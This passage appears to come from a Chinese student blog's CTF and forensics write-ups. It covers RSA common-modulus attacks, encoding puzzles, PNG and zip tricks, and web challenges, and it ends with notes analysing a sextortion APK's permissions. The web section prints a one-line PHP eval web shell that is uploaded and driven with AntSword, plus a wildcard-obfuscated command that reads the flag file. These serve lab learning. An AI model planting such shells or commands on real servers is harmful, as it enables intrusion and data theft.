10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711\nc2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195\n\n# 检查是否互质\ngcd, u, v = gmpy2.gcdext(e1, e2)\nprint(f\"gcd(e1,e2) = {gcd}\")  # 应该是 1\n# u × e1 + v × e2 = gcd(e1, e2)\n\nif gcd == 1:\n    # 计算明文\n    if u < 0:\n        c1 = gmpy2.invert(c1, n)\n        u = -u\n    if v < 0:\n        c2 = gmpy2.invert(c2, n) \n        v = -v\n    m = (pow(c1, u, n) * pow(c2, v, n)) % n\n    flag = long_to_bytes(m)\n    print(flag.decode())\n```\n\n- 共模攻击：[ pow(a, b, n) → n为模数 ]（详见RSA）\n  - 攻击原理：\n    如果 gcd(e1, e2) = 1，可以通过扩展欧几里得算法找到 u, v 使得：\n    u × e1 + v × e2 = 1\n    c1^u × c2^v ≡ m^(u×e1) × m^(v×e2) ≡ m^(u×e1 + v×e2) ≡ m^1 ≡ m (mod n)\n  - 根本原因：RSA 的安全性依赖于大数分解困难性，但当使用相同模数加密相同消息时，攻击者可以利用代数关系绕过分解问题。\n\n### twoEs2\n- 题目：\n```python\nfrom Cryptodome.Util.number import *\nimport random\n\nflag=b\"SPCCTF{********}\"\n\np, q = getPrime(512), getPrime(512)\nn = p * q\n\ne1 = random.getrandbits(32)\ne2 = random.getrandbits(32)\n\nm = bytes_to_long(flag)\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n\nprint(f'{n = }')\nprint(f'{e1 = }')\nprint(f'{e2 = }')\nprint(f'{c1 = }')\nprint(f'{c2 = }')\n\n'''\nn = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991\ne1 = 3739335288\ne2 = 3124897683\nc1 = 33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153\nc2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880\n'''\n```\n- 解法：\n```python\nfrom Cryptodome.Util.number import *\nimport random\nimport gmpy2\n#from Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = 97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991\ne1 = 3739335288\ne2 = 3124897683\nc1 = 33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153\nc2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880\n\ns,s1,s2=gmpy2.gcdext(e1,e2)\nprint('s = ',s)\n\nm = pow(c1, s1, n)*pow(c2, s2, n) % n  # 最后别忘记再模上一个n，整体都在模n中\n#flag = long_to_bytes(m).decode()\nprint(long_to_bytes(iroot(m, 3)[0]))\n#print(flag) \n```\n- [参考](https://saga131.github.io/2024/09/17/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/)；[未看](https://www.cnblogs.com/SevensNight/p/18766177)\n\n### 签个到吧！\n- 题目：\n```brainfuck\n>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++[<+++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++[<++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++++++[<+++++++>-+-+-+-]<[-]>++++++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++[<++++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>+++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<[-]\n```\n- 试图解释：\n  - 快速笔记：“.”为指针位置\n  - \\>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]\n    - \\>+17 ; [<+6>-1] ; ; >+12 ; [<+9>-] ;\n    - 0 17. ; 17*6 = 102 0. ; 0. 0 ; 0 12. ; 9*12 = 108 0. ;\n    - 102 0. → 108 0.\n  - <[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]\n    - < ; >+97 ; [<+>-]\n    - 108\\. 0 ; 108 97. ; 108 + 97 = 205 0.\n- 大概理解了，开造\n```python\ndef brainfuck(a):\n    li = [0]\n    index = 0\n    kuo = []\n    output = []\n    i = 0\n    while i < len(a):\n        if a[i] == '+' or a[i] == '-':\n            li[index] = eval(str(li[index]) + a[i] + '1')\n        elif a[i] == '>':\n            index += 1\n            if len(li) <= index:\n                li.append(0)\n        elif a[i] == '<':\n            index -= 1\n        elif a[i] == '.':\n            print(li[index], end=' ')\n            output.append(li[index])\n        elif a[i] == ',':\n            i += 1\n            li[index] = ord(a[i])\n        elif a[i] == '[':\n            if li[index] == 0:\n                while a[i] != ']':\n                    i += 1\n                i += 1\n            else:\n                kuo.append(i)\n        elif a[i] == ']':\n            if li[index] != 0:\n                i = kuo.pop()-1\n            else:\n                temp = kuo.pop()\n        i += 1\n    return output\n\na = '''\n>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++[<+++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++[<++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++++++[<+++++++>-+-+-+-]<[-]>++++++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++[<++++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>+++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<[-]\n'''\na = a.replace('[-]', '.[-]')\noutput = brainfuck(a)\nfor i in output:\n    print(chr(i), end='')\n```\n- 解释：就是指针内容没有用.输出，所以在[-]删除前加输出从而得到结果\n- 教训：人要好好学习不要偷懒用AI哈哈哈讲的差不多理解就是完全没理解\n\n### xor\n#### 第一步\n![alt text](/img/SPC新生讲座题目_4-1.png)\n- 循环28次（i从0到27）说明flag长度为28个字符\n- 验证条件\n  - v4[i]：用户输入的第i个字符\n  - (unsigned __int8)：将字符转换为无符号8位整数（0-255）\n  - ^ 0x7A：与十六进制0x7A（十进制122）进行异或运算\n  - enc_0[i]：预设的正确加密值的第i个元素\n  - !=：比较是否不相等\n#### 第二步\n![alt text](/img/SPC新生讲座题目_4-2.png)\n- db：Define Byte 表示定义字节数据\n- 有 h 后缀：明确表示十六进制\n- n dup (a)：表示n个a\n#### 解密代码\n```python\nenc_0 = [\n    0x34, 0x29, 0x29, 0x39, 0x2E, 0x3C, 0x01, 0x22, 0x15, 0x08, 0x25,\n    0x13, 0x09, 0x25, 0x18, 0x1B, 0x09, 0x13, 0x19, 0x25, 0x08, 0x1F, 0x0C,\n    0x1F, 0x08, 0x09, 0x1F, 0x07\n]\n\ndef decrypt_flag(enc_data):\n    flag = ''\n    for encrypted in enc_data:\n        # 异或解密：encrypted ^ 0x7A\n        original_char = encrypted ^ 0x7A\n        flag += chr(original_char)\n    return flag\n\n# 解密\nflag = decrypt_flag(enc_0)\nprint(\"解密后的flag:\", flag)\n```\n### 这羽毛球怎么只有一半啊（恼）\n- crc高度题 010editor打开下方有报错信息，记得拉上来看！\n- 代码\n```python\nimport binascii\nimport struct\n \n \n \ncrcbp = open(\"./羽毛球.png\", \"rb\").read()    #打开图片\ncrc32frombp = int(crcbp[29:33].hex(),16)     #读取图片中的CRC校验值\nprint(crc32frombp)\n \nfor i in range(4000):                        #宽度1-4000进行枚举\n    for j in range(4000):                    #高度1-4000进行枚举\n        data = crcbp[12:16] + \\\n            struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]\n        crc32 = binascii.crc32(data) & 0xffffffff\n        #print(crc32)\n        if(crc32 == crc32frombp):            #计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定\n            print(i, j)\n            print('hex:', hex(i), hex(j))\n            exit(0)\n```\n#### 【待】\n- 修改高度（额看了wp改的怎么找）bushi没法理解为什么修改这里\n![alt text](/img/SPC新生讲座题目_4-3.png)\n\n### 掩码爆破\n- 如题，简单\n\n### F12?\n- 当个别网页禁用F12，无法查看网页源代码时，可以通过地址栏操作后使用F12：\n- 打开目标网页后，不要直接按F12，而是先用鼠标点击浏览器地址栏，全选当前网址。在全选网址的状态下，按下F12键。此时，部分网页可能会因为这一操作而解除对F12的禁用，从而允许你打开开发者工具查看源代码。\n\n### F12\n- 极其简单，如题\n  \n### test\n- 极其简单，如题\n\n### word-03\n- 伪加密[参考](https://blog.csdn.net/xiaozhaidada/article/details/124538768)\n  - 特征：\n    - 压缩源文件数据区的全局方式位标记应当为 00 00  （50 4B 03 04 14 00 后）\n    - 且压缩源文件目录区的全局方式位标记应当为 09 00   （50 4B 01 02 14 00 后）\n  - 修改方法：\n    - 确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00。\n- 将这个word文件重命名为zip后，发现还能继续解压\n- 找到flag\n- 反思：搜索时注意是搜索文本还是十六进制，好愚蠢的问题已经第二次犯了|-_-··|\n\n### Basic Number theory\n- 同余基本性质\n  - ‌反身性‌：a ≡ a (mod m)，任何整数与其自身同余。\n  - ‌对称性‌：若a ≡ b (mod m)，则b ≡ a (mod m)，同余关系可逆。‌\n  - ‌传递性‌：若a ≡ b (mod m)且b ≡ c (mod m)，则a ≡ c (mod m)，允许链式推导。\n  - ‌运算性质‌：\n    - 加减性：若a ≡ b (mod m)且c ≡ d (mod m)，则a±c ≡ b±d (mod m)。‌\n    - 乘性：若a ≡ b (mod m)且c ≡ d (mod m)，则ac ≡ bd (mod m)，推广至幂次有aⁿ ≡ bⁿ (mod m)。‌\n    - 消去律‌：若ca ≡ cb (mod m)且(c,m)=1（c与m互质），则a ≡ b (mod m)。‌‌\n- 解决代码+详细计算过程\n```python\np = 105567001902149483225233801278030547652749833525571608392930512645364400245999\nq = 81511997683966846473333390828680375856568631631277717336250575831122994340471\ngift1 = 105419799642658114984760815640014033297217363704585842609128111376906603236722\ngift2 = 81364795424475478232860405190663861501036161810291951552448174562665197331194\n#根据模运算的基本性质：如果 a ≡ b (mod n)，那么 a² ≡ b² (mod n)\nfrom Cryptodome.Util.number import *\nprint(gift1 == pow(gift1,1,p))\n# >>> True\n# 所以gift1² ≡ m^(q+1) (mod q)\n# 继续用费马小定理：\n# gift1² ≡ m^(q+1) (mod q)\n#        ≡ m^q × m (mod q)\n# 根据费马小定理：m^q ≡ m (mod q)（当 q 是素数时）\n# gift1² ≡ m × m (mod q) ≡ m² (mod q)\n# 实际上我们有：gift1^2 ≡ m^2 mod q ; gift2^2 ≡ m^2 mod p\n# 这意味着：gift1^2 - m^2 ≡ 0 mod q  => q | (gift1^2 - m^2)\n#          gift2^2 - m^2 ≡ 0 mod p  => p | (gift2^2 - m^2)\n# 所以(gift1 - m)(gift1 + m) ≡ 0 mod q\n#     (gift2 - m)(gift2 + m) ≡ 0 mod p\n# 关键数学原理：在模素数的情况下，如果 a × b ≡ 0 mod p（其中 p 是素数），那么：\n# 要么 a ≡ 0 mod p\n# 要么 b ≡ 0 mod p\n# 这是因为素数的一个重要性质：模素数的环是整环，没有零因子。\n# 因此 m ≡ ±gift1 mod q ; m ≡ ±gift2 mod p\nimport math\nprint(math.gcd(p,q))\n# >>> 1\n# https://oi-wiki.org/math/number-theory/crt/#%E8%BF%87%E7%A8%8B\n\nfrom sympy.ntheory.modular import crt\n\na = [-gift1,-gift2]\nr = [p,q]\n\nm = crt(r, a)[0]\nflag = long_to_bytes(m)\nprint(flag.decode())\n```\n### basic-RSA\n- 在RAS笔记里学长给做过，考察inverse()函数的应用\n\n### hackbar\n- hackbar浏览器插件使用方法：先LOAD后Use POST method加载网页\n![alt text](/img/SPC新生讲座题目_5-1.png)\n- 直接URL后面添加，插件里添加后按EXECUTE执行\n![alt text](/img/SPC新生讲座题目_5-2.png)\n![alt text](/img/SPC新生讲座题目_5-3.png)\n- 讲座后复刻，好像和学姐教的不一样？（但成功了~~后面问下\n- 愚蠢，只需要下面部分，<?php>\n![alt text](/img/SPC新生讲座题目_5-4.png)\n- 第三关：浏览器身份挑战-要求：我要battlefield_six浏览器\n- 直接更改User-Agent\n![alt text](/img/SPC新生讲座题目_5-5.png)\n- 要求：我要本地访问\n- 解法：如图\n\n### super_baby_eval\n- 网页\n```php\n<?php\nif(isset($_GET['eval']) && $_GET['eval'] === 'gogogo'){\n    echo \"666\";\n    if(isset($_POST['evalpost'])){\n        eval($_POST['evalpost']);\n    }\n} else {\n    show_source(__FILE__);\n}\n?>\n```\n![alt text](/img/SPC新生讲座题目_5-6.png)\n![alt text](/img/SPC新生讲座题目_5-7.png)\n- 查看详细文件信息\n![alt text](/img/SPC新生讲座题目_5-8.png)\n- 硬搜flag获得\n![alt text](/img/SPC新生讲座题目_5-9.png)\n![alt text](/img/SPC新生讲座题目_5-10.png)\n\n### baby_upload\n- 上传php文件\n```php\n<?php\n@eval($_POST['shell']);\n?>\n```\n- 打开Burpsuite代理，记录端口信息\n![alt text](/img/SPC新生讲座题目_5-11.png)\n- 打开中国蚁剑，右键添加数据，密码为php文件变量名\n![alt text](/img/SPC新生讲座题目_5-12.png)\n- 双击数据进入网站文件，根目录寻找flag\n- 成功！\n- [参考](https://www.yuque.com/antswordproject/antsword/uvmwzn)\n\n### baby_eval\n- hackbar body处输入code=/???/?a??64 /??a?\n- 怀疑是/bin因为/?a?没反应应该不是cat\n- base64解码\n\n### super_baby_include\n- 简单\n![alt text](/img/SPC新生讲座题目_5-13.png)\n\n### robots\n- 在HackBar的URL输入：http://靶机地址/robots.txt\n- 选择GET方法（不是POST）!!!\n- 得到/f1agggggggg.txt\n- 输入URL得到flag[](flag{You_1InD_ROB0T5!!!_20576b704467})\n\n### 爆破\n- Burpsuite也可以，但注意光标偏移问题payload位置以添加完毕显示为准，而且有自动添加payload功能只是删除多余payload也要注意偏移问题！！！\n- yakit成功[参考](https://blog.csdn.net/miraclehw/article/details/134138197)\n![alt text](/img/SPC新生讲座题目_5-14.png)\n- 没找到本地文件导入，但有临时文件导入按行读取功能一样成功，( •̀ ω •́ )耶\n\n","tags":["wp","ctf","共模攻击","spc"],"categories":["wp"]},{"title":"第三届长安杯笔记","url":"/2025/10/01/第三届长安杯笔记/","content":"### 鸣谢\n- 感谢sq学长和cty学姐的帮助和教导！！！\n- 第一个大型比赛复刻学习结束了，好累(｡し_し｡)但是继续出发(≧▽≦)哈哈哈\n\n### 2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包--zhibo.apk（检材一），请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例：192.168.100.100-CAB2021）\n#### 1. 请计算检材一Apk的SHA256值：\n1）直接将apk拖入hashcal计算\n2）雷电APP智能分析直接出，但注意SHA256的主体是检材\n\n![alt text](/img/第三届长安杯笔记_2-1.png)\n3）window自带工具：certutil -hashfile 检材一-zhibo.apk sha256\n\n\n#### 2. 该APK的应用包名为\n1）使用jadx反编译，查看AndroidManifest.xml，package的值就是包名\n2）雷电APP智能分析直接出\n\n![alt text](/img/第三届长安杯笔记_2-2.png)\n#### 3. 该APK程序在封装服务商的应用唯一标识（APPID）为\n- 使用jadx反编译，可以在assets的apps目录下找到，文件夹名字就是\n- xml文件第一行后面也有 package=\"plus.H5B8E45D3\" ，应用包名后半部分与APPID一致（？不确定\n\n![alt text](/img/第三届长安杯笔记_2-5.png)\n——[来源](https://www.cnblogs.com/WXjzc/p/16113357.html)\n\n![alt text](/img/第三届长安杯笔记_2-6.png)\n\n**查证：**\n1. “应用ID必须至少包含两段（一个或多个圆点）。每段必须以字母开头，所有字符必须为字母数字或下划线 [a-zA-Z0-9_]。例如，com.example.myapp 是一个有效的应用ID。”——[来源](https://www.oryoy.com/news/yi-zhao-jiao-ni-qing-song-huo-qu-android-ying-yong-de-wei-yi-biao-shi-appid-a13839322.html)\n**应该是写错了这个讲的是应用包名**\n1. 问deepseek\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n\n| 维度 | APK 包名 | 服务商 APPID |\n| :--- | :--- | :--- |\n| **定义与归属** | 技术身份：在代码中定义，是应用在安卓系统中的唯一技术标识。 | 商业身份：由应用商店或服务商（如华为、腾讯、阿里）分配，是其在平台生态内的唯一商业标识。 |\n| **设定者** | 开发者。 | 服务商平台系统（当开发者上传应用时生成或分配）。 |\n| **唯一性范围** | 全球唯一（理论上）。谷歌建议使用逆序域名来确保这一点（如 `com.companyname.appname`）。 | 平台内唯一。同一个应用在不同商店可能有不同的 APPID。 |\n| **是否可变** | 不可变。一旦发布，更改包名等同于创建了一个全新的应用。 | 通常不变，但理论上平台有权重新分配。同一个应用更新版本，其 APPID 不变。 |\n| **主要用途** | 1. 系统识别：安卓系统通过包名来区分不同应用。<br>2. 安装与更新：系统根据包名判断是安装新应用还是更新现有应用。<br>3. 进程标识：应用进程名通常以包名开头。 | 1. 平台管理：用于商店后台的统计、更新、收费管理等。<br>2. API 调用：集成该服务商 SDK（如推送、登录、支付）时，需要用 APPID 来标识自身。<br>3. 应用分发：生成商店下载链接。 |\n| **示例** | `com.tencent.mm` (微信)<br>`com.netease.cloudmusic` (网易云音乐) | 华为应用市场：`C1000000001`<br>腾讯开放平台：`110xxxxxx`<br>阿里应用分发：`12345` |\n</div>\n在您提供的案例中（包名为 plus.H5B8E45D3，文件夹名为 H5B8E45D3），文件夹名就是APPID的可能性超过了90%。\n因为这种“包名 = 固定前缀 + APPID”的结构，本身就是服务商为了将技术标识和商业标识强绑定而设计的。因此，在资源目录下使用APPID作为路径的一部分，是保持逻辑一致性的最合理做法。\n\n- 还是不清楚但解题可以APP直接做到\n\n![alt text](/img/第三届长安杯笔记_2-3.png)\n“当然也可以去网站源文件里面确认，就是看ID”（？没找到APP内的地方）——[来源](https://blog.csdn.net/ntrybw/article/details/126977777)\n   \n#### 4. 该APK具备下列哪些危险权限(多选题)：\nA.读取短信  B.读取通讯录 C.读取精确位置 D.修改通讯录 E.修改短信\n- APP直接做到\n\n![alt text](/img/第三届长安杯笔记_2-4.png)\n- xml文件内查找\n```html\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.INSTALL_PACKAGES\"/>\n    <uses-permission android:name=\"android.permission.REQUEST_INSTALL_PACKAGES\"/>\n    <uses-feature android:name=\"android.hardware.camera\"/>\n    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n    <uses-permission android:name=\"android.permission.READ_SMS\"/>\n    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_SMS\"/>\n    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"android.permission.MOUNT_UNMOUNT_FILESYSTEMS\"/>\n    <uses-permission android:name=\"android.permission.READ_LOGS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>\n    <uses-permission android:name=\"com.huawei.android.launcher.permission.CHANGE_BADGE\"/>\n    <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"com.asus.msa.SupplementaryDID.ACCESS\"/>\n```\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n<!-- 表格输入位置 -->\n \n| name=后面的字符串 | 对应代表权限意思 |\n| :--- | :--- |\n| `android.permission.INTERNET` | 访问互联网 |\n| `android.permission.WRITE_EXTERNAL_STORAGE` | 写入外部存储 |\n| `android.permission.ACCESS_NETWORK_STATE` | 访问网络状态 |\n| `android.permission.ACCESS_WIFI_STATE` | 访问Wi-Fi状态 |\n| `android.permission.INSTALL_PACKAGES` | 安装程序包 |\n| `android.permission.REQUEST_INSTALL_PACKAGES` | 请求安装程序包 |\n| `android.hardware.camera` | 需要摄像头 (硬件功能) |\n| `android.hardware.camera.autofocus` | 需要自动对焦 (硬件功能) |\n| `android.permission.ACCESS_COARSE_LOCATION` | 访问粗略位置 |\n| `android.permission.ACCESS_FINE_LOCATION` | 访问精确位置 |\n| `android.permission.READ_CONTACTS` | 读取联系人 |\n| `android.permission.READ_SMS` | 读取短信 |\n| `android.permission.RECEIVE_SMS` | 接收短信 |\n| `android.permission.ACCESS_COARSE_LOCATION` | 访问粗略位置 |\n| `android.permission.ACCESS_FINE_LOCATION` | 访问精确位置 |\n| `android.permission.SEND_SMS` | 发送短信 |\n| `android.permission.WRITE_SMS` | 写入短信 |\n| `android.permission.GET_ACCOUNTS` | 获取账户列表 |\n| `android.permission.WRITE_CONTACTS` | 写入联系人 |\n| `android.permission.ACCESS_WIFI_STATE` | 访问Wi-Fi状态 |\n| `android.permission.ACCESS_NETWORK_STATE` | 访问网络状态 |\n| `android.permission.CHANGE_WIFI_STATE` | 更改Wi-Fi状态 |\n| `android.permission.READ_PHONE_STATE` | 读取手机状态 |\n| `android.permission.WRITE_EXTERNAL_STORAGE` | 写入外部存储 |\n| `android.permission.MOUNT_UNMOUNT_FILESYSTEMS` | 挂载和卸载文件系统 |\n| `android.permission.READ_LOGS` | 读取系统日志 |\n| `android.permission.WRITE_SETTINGS` | 写入系统设置 |\n| `com.huawei.android.launcher.permission.CHANGE_BADGE` | 华为角标权限 |\n| `android.permission.READ_EXTERNAL_STORAGE` | 读取外部存储 |\n| `com.asus.msa.SupplementaryDID.ACCESS` | 华硕补充设备ID权限 |\n</div>\n\n反思：联网可以直接丢给ai，断网可以复制黏贴到txt搜索read,write等词\n[网上找到的对应关系表，在images文件夹存储文件名为：安卓权限中英文对应表.jpeg](https://www.cnblogs.com/linn/p/4046180.html)\n\n\n#### 5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)：\nA.手机通讯录 B.手机应用列表 C.手机号码 D.验证码 E.GPS定位信息\n##### 法一\n- 雷电软件 其他模式抓不到，使用代理模式抓包能抓到CD【复刻失败方法】\n\n![alt text](/img/第三届长安杯笔记_2-7.png)\n![alt text](/img/第三届长安杯笔记_2-8.png)\n- 模拟器请求手机通讯录，猜测有A\n- 添加锁屏密码和通讯录信息后抓包获得\n\n![alt text](/img/第三届长安杯笔记_6.png)\n![alt text](/img/第三届长安杯笔记_7.png)\n- 答案都出来了，耶\n\n- 官方文档：\n- 抓包方式介绍\n- 雷电APP智能分析软件目前提供了4种抓包方式，分别是**HTTP、TCP、代理模式、TCPDump**，Android 支持全部4种方式，iOS 目前只支持代理模式抓包，下面分别介绍四种方式的应用场景：\n  - HTTP 方式是基于手机 VPN 原理实现的抓包，一般情况下如果是要抓HTTP 协议的网络数据包推荐这种方式，不过后台服务器已经不在运行的情况下使用该方式无法抓取到网络数据包。\n  - TCP 方式同样是基于手机 VPN 原理实现的抓包，如果网络数据包是原生 TCP 协议的话推荐使用这种方式。\n  - 代理模式是基于在手机或者模拟器上设置代理地址实现的抓包（和 fiddler、charles 原理相同），软件会自动设置代理 IP 地址，无需手动填写代理地址，这种方式的优点是后台服务器不在运行的情况下也能抓到请求的网络数据包。\n  - TCPDump 模式是基于 libpcap 